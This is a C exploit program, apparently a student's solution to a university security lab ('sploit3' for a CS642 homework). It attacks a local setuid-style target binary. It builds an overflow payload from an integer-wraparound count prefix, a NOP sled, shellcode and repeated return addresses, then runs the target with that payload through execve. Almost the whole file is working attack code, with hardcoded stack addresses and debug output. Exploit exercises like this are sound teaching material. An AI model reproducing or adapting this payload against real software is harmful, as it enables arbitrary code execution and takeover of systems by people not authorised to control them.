#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int debug = 0;
int debug1 = 0;
int debug2 = 0;

//int main(void)
int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];

  int buffsize = 2740;
  int nop_size = 1320;
  int splength = 343;
  int end = 0;

  if(argc==2){
    nop_size=atoi(argv[1]);
    if(debug) printf("nop_size = %i\n", nop_size);
    int ending = buffsize-nop_size-strlen(shellcode);  
    splength = ending/4;
    if(debug) printf("splength = %i\n", splength); 
    end = (ending+1)%4; 
    if(debug) printf("end = %i\n", end);
  }

  char instructions[buffsize];
  char count[] = "4294964556,";
  //char* myposition = (char*) instructions[0];

  strncpy(instructions, count, strlen(count));
  if(debug1) printf("instr length = %i\n", strlen(instructions));
  if(debug2) printf("instr1=%s of length %i\n", instructions, strlen(instructions));
  // NOP instructions
  memset(instructions+strlen(count), '\x90', nop_size);
  if(debug1) printf("instr length = %i\n", strlen(instructions));
  if(debug2) printf("instr2=%s of length %i\n", instructions, strlen(instructions));
  // shellcode
  strncpy(instructions+strlen(count)+nop_size, shellcode, strlen(shellcode));
  if(debug1) printf("instr length = %i\n", strlen(instructions));
  if(debug2) printf("instr3=%s of length %i\n", instructions, strlen(instructions));
  // return address to pop 0xbffffce0
  // formatted like sp-repeat
//  strcpy(instructions+strlen(count)+nop_size+strlen(shellcode), "\xe0\xfc\xff\xbf", splength*4);
 
//  memset(instructions+buffsize-end, '\x90', end);
//  memset(instructions+buffsize, '\x00', 1);
  int i=0;
  while(i<splength){
     strncpy(instructions+strlen(count)+nop_size+strlen(shellcode)+(i*4), "\x54\xe9\xff\xbf", 4); 
     i++;
  }

  if(debug1) printf("instr length = %i\n", strlen(instructions));
  // last byte overflowi
  memset(instructions+buffsize-end, '\x90', end);
  memset(instructions+buffsize, '\x00', 1);
/*
  int j=1;
  while(j<=end){
    strncpy(instructions+buffsize-j, "\x90", 1);
    j++;
  }
*/
  if(debug1) printf("instr length = %i\n", strlen(instructions));



//print instr to file
   FILE *fptr;
 
   fptr = fopen("/home/user/CS642/CS642-HW1_sploit3_SCRATCHSPACE/sploits/instr.txt","w");

   if(fptr == NULL)
   {
      printf("Error!");   
      exit(1);             
   }

   fprintf(fptr,"%s",instructions);
   fclose(fptr);


  args[0] = TARGET; args[1] = instructions; args[2] = NULL;
  env[0] = NULL;

  if(debug2) printf("args[1]=%s\n", args[1]);

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
